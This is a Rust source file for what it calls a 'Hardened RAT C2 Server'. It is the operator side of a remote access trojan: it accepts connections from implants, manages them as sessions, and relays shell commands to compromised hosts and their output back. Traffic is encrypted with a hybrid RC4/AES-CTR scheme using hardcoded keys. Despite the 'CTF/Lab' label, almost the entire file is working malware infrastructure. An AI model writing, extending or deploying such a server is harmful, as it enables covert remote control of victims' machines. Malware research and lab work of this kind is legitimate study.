//! Hardened RAT C2 Server — Rust Edition
//!
//! Multi-session C2 server with:
//! - RC4 + AES-128-CTR hybrid encrypted communications
//! - Session management (multiple simultaneous implants)
//! - Interactive shell per session
//! - Logging with timestamps
//!
//! For CTF/Lab Environments Only.

mod session;

use rat_common::crypto::HybridCipher;
use rat_common::protocol::{FramedReader, FramedWriter};
use session::{Session, SessionManager};
use std::io::{self, BufRead, Write};
use std::net::TcpListener;
use std::sync::{Arc, Mutex};
use std::thread;

/// Default listen port.
const DEFAULT_PORT: u16 = 50005;

/// Shared encryption keys (must match the implant).
const RC4_KEY: &[u8] = b"MySecretKey2024!";
const AES_KEY: &[u8; 16] = b"AES128CTFKey2024";

fn main() {
    print_banner();

    let args: Vec<String> = std::env::args().collect();
    let port = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(DEFAULT_PORT);
    let host = args.get(2).map(|s| s.as_str()).unwrap_or("0.0.0.0");
    let addr = format!("{host}:{port}");

    let manager = Arc::new(Mutex::new(SessionManager::new()));
    let manager_clone = Arc::clone(&manager);

    // Listener thread
    let listener_handle = thread::spawn(move || {
        run_listener(&addr, manager_clone);
    });

    // Interactive console
    run_console(Arc::clone(&manager));

    // Cleanup
    drop(listener_handle);
    log_msg("Server stopped");
}

/// Accept incoming connections and register sessions.
fn run_listener(addr: &str, manager: Arc<Mutex<SessionManager>>) {
    let listener = match TcpListener::bind(addr) {
        Ok(l) => {
            log_msg(&format!("Listening on {addr}"));
            log_msg("Waiting for connections...");
            l
        }
        Err(e) => {
            log_msg(&format!("Failed to bind {addr}: {e}"));
            return;
        }
    };

    // Non-blocking accept with timeout
    listener
        .set_nonblocking(false)
        .expect("Cannot set blocking");

    for incoming in listener.incoming() {
        match incoming {
            Ok(stream) => {
                let peer = stream
                    .peer_addr()
                    .map(|a| a.to_string())
                    .unwrap_or_else(|_| "unknown".into());
                log_msg(&format!("New connection from {peer}"));

                let session = Session::new(stream, peer.clone());
                let mut mgr = manager.lock().unwrap();
                let id = mgr.add(session);
                log_msg(&format!("Registered as session #{id}"));
            }
            Err(e) => {
                log_msg(&format!("Accept error: {e}"));
            }
        }
    }
}

/// Interactive operator console.
fn run_console(manager: Arc<Mutex<SessionManager>>) {
    let stdin = io::stdin();
    let mut stdout = io::stdout();

    println!("\nType 'help' for available commands.\n");

    loop {
        print!("c2> ");
        stdout.flush().unwrap();

        let mut line = String::new();
        if stdin.lock().read_line(&mut line).is_err() {
            break;
        }
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        match line {
            "help" | "?" => print_help(),
            "sessions" | "list" => {
                let mgr = manager.lock().unwrap();
                mgr.list();
            }
            "quit" | "exit" => {
                log_msg("Shutting down...");
                break;
            }
            s if s.starts_with("interact ") => {
                if let Ok(id) = s[9..].trim().parse::<usize>() {
                    interact_session(&manager, id);
                } else {
                    println!("Usage: interact <session_id>");
                }
            }
            s if s.starts_with("kill ") => {
                if let Ok(id) = s[5..].trim().parse::<usize>() {
                    let mut mgr = manager.lock().unwrap();
                    mgr.remove(id);
                    log_msg(&format!("Session #{id} killed"));
                } else {
                    println!("Usage: kill <session_id>");
                }
            }
            _ => {
                println!("Unknown command: {line}. Type 'help' for usage.");
            }
        }
    }
}

/// Enter interactive mode with a specific session.
fn interact_session(manager: &Arc<Mutex<SessionManager>>, id: usize) {
    let session = {
        let mgr = manager.lock().unwrap();
        mgr.get(id).cloned()
    };

    let session = match session {
        Some(s) => s,
        None => {
            println!("Session #{id} not found or disconnected.");
            return;
        }
    };

    println!("[*] Interacting with session #{id} ({})", session.peer);
    println!("[*] Type 'background' to return to the main console.\n");

    let stream = match session.stream.lock() {
        Ok(s) => s.try_clone().expect("Failed to clone stream"),
        Err(_) => {
            println!("[-] Failed to lock session stream.");
            return;
        }
    };

    let cipher_r = HybridCipher::new(RC4_KEY, AES_KEY);
    let cipher_w = HybridCipher::new(RC4_KEY, AES_KEY);
    let mut reader = FramedReader::new(stream.try_clone().unwrap(), cipher_r);
    let mut writer = FramedWriter::new(stream, cipher_w);

    // Receive initial banner if any
    match reader.recv_string() {
        Ok(Some(banner)) => print!("{banner}"),
        Ok(None) => {
            println!("[-] Session disconnected.");
            return;
        }
        Err(e) => {
            println!("[-] Read error: {e}");
            return;
        }
    }

    let stdin = io::stdin();
    let mut stdout = io::stdout();

    loop {
        print!("\n{}> ", session.peer);
        stdout.flush().unwrap();

        let mut cmd = String::new();
        if stdin.lock().read_line(&mut cmd).is_err() {
            break;
        }
        let cmd = cmd.trim();

        if cmd.is_empty() {
            continue;
        }

        if cmd == "background" {
            println!("[*] Backgrounding session #{id}");
            break;
        }

        // Send command
        if let Err(e) = writer.send(cmd.as_bytes()) {
            println!("[-] Send error: {e}");
            break;
        }

        if cmd == "exit" || cmd == "q" {
            log_msg(&format!("Session #{id} terminated by operator"));
            let mut mgr = manager.lock().unwrap();
            mgr.remove(id);
            break;
        }

        // Receive response
        match reader.recv_string() {
            Ok(Some(response)) => print!("{response}"),
            Ok(None) => {
                println!("[-] Session disconnected.");
                let mut mgr = manager.lock().unwrap();
                mgr.remove(id);
                break;
            }
            Err(e) => {
                println!("[-] Recv error: {e}");
                break;
            }
        }
    }
}

fn log_msg(msg: &str) {
    let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
    println!("[{ts}] {msg}");
}

fn print_banner() {
    println!(
        r#"
 ╔═══════════════════════════════════════════════════════════╗
 ║       Hardened RAT C2 Server — Rust Edition               ║
 ║       RC4 + AES-128-CTR Hybrid Encryption                 ║
 ║       CTF / Educational Use Only                          ║
 ╚═══════════════════════════════════════════════════════════╝
"#
    );
}

fn print_help() {
    println!(
        r#"
  sessions / list      — List active sessions
  interact <id>        — Interact with a session
  kill <id>            — Kill a session
  quit / exit          — Shut down the C2 server
  help / ?             — Show this help
"#
    );
}
